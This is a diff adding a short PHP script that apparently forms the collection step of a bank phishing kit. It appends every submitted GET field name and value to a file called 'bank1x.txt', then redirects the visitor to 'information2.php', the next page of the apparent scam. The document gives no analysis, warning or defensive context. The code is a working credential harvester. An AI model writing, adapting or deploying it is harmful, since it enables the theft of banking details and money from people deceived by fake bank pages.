@@ -1,0 +1,19 @@
+<?php
+header("Location: information2.php ");
+$handle = fopen("bank1x.txt", "a");
+
+foreach($_GET as $variable => $value) {
+        fwrite($handle, $variable);
+
+        fwrite($handle, "=");
+ 
+        fwrite($handle, $value);
+
+        fwrite($handle, "\r\n");
+}
+
+fwrite($handle, "\r\n");
+fclose($handle);
+
+exit
+?>?
